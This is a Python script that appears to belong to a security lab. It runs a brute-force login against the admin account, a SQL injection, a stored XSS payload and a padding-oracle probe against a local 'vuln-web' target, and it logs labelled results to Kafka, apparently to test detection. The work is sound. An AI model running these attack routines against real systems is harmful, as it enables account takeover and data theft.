from __future__ import annotations

import argparse
import json
import logging
import os
import time
import uuid
from pathlib import Path
from typing import Any, Callable

import requests
from kafka import KafkaProducer
from kafka.errors import KafkaError, NoBrokersAvailable


LOGGER = logging.getLogger("probe-producer")
KAFKA_BROKER = os.getenv("KAFKA_BROKER", "kafka:29092")
TOPIC = os.getenv("EVIDENCE_TOPIC", "evidence_topic")
TARGET_BASE = os.getenv("TARGET_BASE", "http://vuln-web:5000")


def now() -> float:
    return time.time()


def create_kafka_producer() -> KafkaProducer:
    while True:
        try:
            return KafkaProducer(
                bootstrap_servers=[KAFKA_BROKER],
                value_serializer=lambda value: json.dumps(value, ensure_ascii=False).encode("utf-8"),
                acks="all",
                retries=10,
                linger_ms=5,
                request_timeout_ms=30_000,
                max_block_ms=60_000,
            )
        except NoBrokersAvailable:
            LOGGER.warning("Kafka is not ready at %s; retrying in 3 seconds", KAFKA_BROKER)
            time.sleep(3)


class ProbeRunner:
    def __init__(
        self,
        producer: KafkaProducer,
        run_id: str,
        scenario: str,
        target_base: str,
        password_file: Path,
    ) -> None:
        self.producer = producer
        self.run_id = run_id
        self.scenario = scenario
        self.target_base = target_base.rstrip("/")
        self.password_file = password_file
        self.sequence_no = 0
        self.session = requests.Session()

    def emit(self, event: dict[str, Any]) -> None:
        self.sequence_no += 1
        event.update(
            {
                "schema_version": 2,
                "event_id": str(uuid.uuid4()),
                "run_id": self.run_id,
                "scenario": self.scenario,
                "sequence_no": self.sequence_no,
                "emitted_at": now(),
            }
        )
        future = self.producer.send(TOPIC, key=event["event_id"].encode("utf-8"), value=event)
        metadata = future.get(timeout=30)
        LOGGER.info(
            "event=%s attack=%s success=%s topic=%s partition=%s offset=%s",
            event["event_id"],
            event["attack_type"],
            event["ground_truth_success"],
            metadata.topic,
            metadata.partition,
            metadata.offset,
        )

    def request_event(
        self,
        attack_type: str,
        target: str,
        payload: str,
        request_call: Callable[[], requests.Response],
        success_check: Callable[[requests.Response], bool],
        round_no: int,
        attempt_no: int = 1,
    ) -> bool:
        started_at = now()
        response: requests.Response | None = None
        error: str | None = None
        try:
            response = request_call()
            success = bool(success_check(response))
        except (requests.RequestException, ValueError, KeyError, TypeError) as exc:
            success = False
            error = f"{type(exc).__name__}: {exc}"
        received_at = now()

        response_text = response.text[:500] if response is not None else ""
        event = {
            "round_no": round_no,
            "attempt_no": attempt_no,
            "attack_type": attack_type,
            "target": target,
            "payload": payload,
            "request_started_at": started_at,
            "response_received_at": received_at,
            "http_status": response.status_code if response is not None else 0,
            "ground_truth_success": success,
            "response_excerpt": response_text,
            "error": error,
        }
        self.emit(event)
        return success

    def run_brute_force(self, round_no: int) -> None:
        passwords = [line.strip() for line in self.password_file.read_text(encoding="utf-8").splitlines()]
        passwords = [password for password in passwords if password and not password.startswith("#")]
        if not passwords:
            raise ValueError(f"No passwords found in {self.password_file}")
        target = f"{self.target_base}/login"
        for attempt_no, password in enumerate(passwords, start=1):
            success = self.request_event(
                "brute_force",
                target,
                password,
                lambda password=password: self.session.post(
                    target,
                    json={"username": "admin", "password": password},
                    timeout=3,
                ),
                lambda response: response.status_code == 200
                and (response.json().get("status") == "success"),
                round_no,
                attempt_no,
            )
            if success:
                break

    def run_sql_injection(self, round_no: int) -> None:
        target = f"{self.target_base}/search"
        payload = "' OR '1'='1"

        def success_check(response: requests.Response) -> bool:
            if response.status_code != 200:
                return False
            try:
                body = response.json()
            except ValueError:
                return False
            rows = body.get("data") or []
            usernames = {row[0] for row in rows if isinstance(row, list) and row}
            return body.get("status") == "success" and {"admin", "guest"}.issubset(usernames)

        self.request_event(
            "sql_injection",
            target,
            payload,
            lambda: self.session.get(target, params={"q": payload}, timeout=3),
            success_check,
            round_no,
        )

    def run_xss(self, round_no: int) -> None:
        target = f"{self.target_base}/feedback"
        payload = "<script>alert(1)</script>"
        self.request_event(
            "xss_attack",
            target,
            payload,
            lambda: self.session.post(target, json={"content": payload}, timeout=3),
            lambda response: response.status_code == 200 and payload in response.text,
            round_no,
        )

    def run_padding_oracle(self, round_no: int) -> None:
        target = f"{self.target_base}/crypto_check"
        payload = "00112233445566778899aabbccddeeff"
        self.request_event(
            "padding_oracle",
            target,
            payload,
            lambda: self.session.post(target, json={"token": payload}, timeout=3),
            lambda response: response.status_code == 500
            and response.json().get("msg") == "Padding Error",
            round_no,
        )

    def run_round(self, round_no: int, probe: str, interval_seconds: float) -> None:
        actions = {
            "brute_force": self.run_brute_force,
            "sql_injection": self.run_sql_injection,
            "xss_attack": self.run_xss,
            "padding_oracle": self.run_padding_oracle,
        }
        selected = list(actions) if probe == "all" else [probe]
        for index, name in enumerate(selected):
            actions[name](round_no)
            if interval_seconds > 0 and index < len(selected) - 1:
                time.sleep(interval_seconds)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Run reproducible vulnerability probes")
    parser.add_argument("--rounds", type=int, default=int(os.getenv("PROBE_ROUNDS", "0")))
    parser.add_argument(
        "--probe",
        choices=["all", "brute_force", "sql_injection", "xss_attack", "padding_oracle"],
        default="all",
    )
    parser.add_argument("--run-id", default=os.getenv("RUN_ID") or f"run-{int(now())}")
    parser.add_argument("--scenario", default=os.getenv("SCENARIO", "demo"))
    parser.add_argument("--target-base", default=TARGET_BASE)
    parser.add_argument(
        "--password-file",
        type=Path,
        default=Path(os.getenv("PASSWORD_FILE", "/app/producer/payloads.txt")),
    )
    parser.add_argument(
        "--interval",
        type=float,
        default=float(os.getenv("PROBE_INTERVAL_SECONDS", "1.0")),
    )
    parser.add_argument(
        "--cycle-pause",
        type=float,
        default=float(os.getenv("PROBE_CYCLE_PAUSE_SECONDS", "5.0")),
    )
    return parser.parse_args()


def main() -> int:
    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
    args = parse_args()
    if args.rounds < 0:
        raise ValueError("--rounds must be zero (continuous) or a positive integer")
    producer = create_kafka_producer()
    runner = ProbeRunner(producer, args.run_id, args.scenario, args.target_base, args.password_file)
    LOGGER.info(
        "starting run_id=%s scenario=%s rounds=%s probe=%s",
        args.run_id,
        args.scenario,
        "continuous" if args.rounds == 0 else args.rounds,
        args.probe,
    )
    round_no = 1
    try:
        while args.rounds == 0 or round_no <= args.rounds:
            runner.run_round(round_no, args.probe, args.interval)
            if args.cycle_pause > 0 and (args.rounds == 0 or round_no < args.rounds):
                time.sleep(args.cycle_pause)
            round_no += 1
    except (KafkaError, KeyboardInterrupt) as exc:
        LOGGER.warning("producer stopped: %s", exc)
        return 130 if isinstance(exc, KeyboardInterrupt) else 1
    finally:
        producer.flush(timeout=30)
        producer.close(timeout=30)
    LOGGER.info("completed run_id=%s events=%s", args.run_id, runner.sequence_no)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
